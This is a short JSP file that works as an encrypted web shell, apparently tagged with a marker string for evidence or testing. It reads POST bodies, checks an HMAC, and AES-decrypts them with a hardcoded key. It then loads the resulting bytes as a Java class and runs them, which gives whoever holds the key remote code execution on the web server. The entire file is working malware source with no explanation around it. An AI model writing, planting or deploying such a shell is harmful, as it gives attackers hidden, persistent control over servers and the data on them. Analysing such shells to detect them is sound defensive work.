<%out.print("FILEOPS_EVIDENCE_evd1791645075");%><%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
private byte[] Decrypt(byte[] data) throws Exception
{
    String key = "f033ed002541df63";
    byte[] raw = key.getBytes("UTF-8");
    javax.crypto.spec.SecretKeySpec sk = new javax.crypto.spec.SecretKeySpec(raw, "AES");
    byte[] iv = new byte[16];
    System.arraycopy(data, 0, iv, 0, 16);
    byte[] tag = new byte[32];
    System.arraycopy(data, data.length - 32, tag, 0, 32);
    byte[] body = new byte[data.length - 48];
    System.arraycopy(data, 16, body, 0, body.length);
    javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
    mac.init(sk);
    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
    bos.write(iv);
    bos.write(body);
    byte[] check = mac.doFinal(bos.toByteArray());
    if (!java.security.MessageDigest.isEqual(check, tag))
    {
        throw new Exception("bad mac");
    }
    javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(javax.crypto.Cipher.DECRYPT_MODE, sk, new javax.crypto.spec.IvParameterSpec(iv));
    return cipher.doFinal(body);
}
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>
